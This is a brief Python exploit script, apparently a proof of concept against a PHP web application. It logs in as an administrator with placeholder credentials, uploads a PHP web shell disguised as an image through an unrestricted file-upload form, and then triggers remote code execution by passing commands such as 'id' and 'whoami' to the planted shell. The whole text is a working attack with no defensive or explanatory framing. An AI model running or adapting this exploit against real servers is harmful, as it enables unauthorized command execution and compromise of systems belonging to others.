import requests
import random
import string

url = "<target-url>"
s = requests.Session()

# 1. Login
login_data = {
    "username": "<admin-username>",
    "password": "<admin-pass>",
    "login": "1"
}

s.post(url + "/admin_login.php", data=login_data)

# 2. Prepare payload
random_file = ''.join(random.choice(string.ascii_letters) for _ in range(8))
payload = "<?php system($_GET['cmd']); ?>"

files = {
    "image": (random_file + ".php", payload, "application/x-php")
}

data = {
    "add": "1"
}

# 3. Upload shell
s.post(url + "/admin_add.php", files=files, data=data)

# 4. Build shell URL
shell_url = url + "/bootstrap/img/" + random_file + ".php"

# 5. Trigger RCE
r = s.get(shell_url, params={"cmd": "id"})

# 6. Output results
print("[+] RCE Output:")
print(r.text)

print("\n[+] Web shell available at:")
print(shell_url)
print("\n[+] Example usage:")
print(shell_url + "?cmd=whoami")
